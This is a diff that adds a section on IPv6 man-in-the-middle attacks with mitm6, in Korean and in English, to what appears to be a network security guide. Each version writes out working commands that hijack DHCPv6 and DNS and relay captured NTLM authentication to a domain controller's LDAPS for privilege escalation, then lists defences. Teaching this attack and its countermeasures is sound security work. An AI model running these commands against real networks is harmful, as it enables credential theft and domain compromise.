@@ -375,6 +375,29 @@ if __name__ == "__main__":
 
 ---
 
+## 5.5 IPv6 MITM (mitm6)
+
+Windows는 IPv4 주소가 정상 동작 중이어도 IPv6를 기본으로 선호하며, 부팅 시 DHCPv6 요청을 브로드캐스트합니다. 이 요청에 공격자가 먼저 응답하면 피해자의 **DNS 서버를 공격자로 지정**할 수 있어, IPv4 라우팅을 건드리지 않고도 이름 해석을 가로챌 수 있습니다(WPAD·내부 호스트 위장). 실무에서는 여기서 얻은 인증을 impacket `ntlmrelayx`로 도메인 컨트롤러의 LDAP(S)에 릴레이해 권한 상승으로 이어갑니다.
+
+```bash
+# 설치 (fox-it/mitm6 + impacket)
+pip3 install mitm6 impacket
+
+# 1) mitm6: 대상 도메인의 DHCPv6/DNS 응답을 탈취 (-d = AD 도메인)
+sudo mitm6 -d corp.local -i eth0
+
+# 2) 별도 터미널: 가로챈 인증을 DC의 LDAPS로 릴레이
+#    --delegate-access: 릴레이 성공 시 공격자 통제 컴퓨터 계정에 위임 설정
+ntlmrelayx.py -6 -t ldaps://dc01.corp.local -wh attacker-wpad --delegate-access
+
+# 관찰 포인트: 피해자가 재부팅/로그온하며 DHCPv6 요청 → mitm6가 DNS 응답
+#             → WPAD 조회가 공격자로 향함 → SMB/HTTP 인증 캡처 → LDAP 릴레이
+```
+
+IPv6를 사용하지 않는 네트워크라면 라우터 광고(RA) 가드와 DHCPv6 스누핑을 켜고, 불필요한 경우 엔드포인트에서 IPv6를 정책으로 비활성화하는 것이 근본 방어입니다. LDAP 서명·채널 바인딩을 강제하면 릴레이 단계가 차단됩니다.
+
+---
+
 ## 6. MITM 탐지 방어
 
 | 공격 | 탐지 방법 | 방어 |
@@ -688,6 +711,29 @@ def main() -> None:
 if __name__ == "__main__":
     main()
 ```
+
+---
+
+## 5.5 IPv6 MITM (mitm6)
+
+Windows prefers IPv6 by default even when IPv4 is working, and broadcasts a DHCPv6 request at boot. If an attacker answers first, they can set themselves as the victim's **DNS server**, hijacking name resolution (WPAD / internal host spoofing) without touching IPv4 routing at all. In practice the captured authentication is relayed with impacket `ntlmrelayx` to a domain controller's LDAP(S) to escalate privileges.
+
+```bash
+# Install (fox-it/mitm6 + impacket)
+pip3 install mitm6 impacket
+
+# 1) mitm6: hijack DHCPv6/DNS responses for the target domain (-d = AD domain)
+sudo mitm6 -d corp.local -i eth0
+
+# 2) In a second terminal: relay captured auth to the DC's LDAPS
+#    --delegate-access: on a successful relay, grant delegation to an attacker-controlled computer account
+ntlmrelayx.py -6 -t ldaps://dc01.corp.local -wh attacker-wpad --delegate-access
+
+# Watch: victim reboots/logs on -> sends DHCPv6 -> mitm6 answers as DNS
+#        -> WPAD lookup points to attacker -> SMB/HTTP auth captured -> relayed to LDAP
+```
+
+If the network does not use IPv6, enable Router Advertisement (RA) guard and DHCPv6 snooping, and disable IPv6 on endpoints by policy where it is unnecessary. Enforcing LDAP signing and channel binding blocks the relay stage.
 
 ---
 
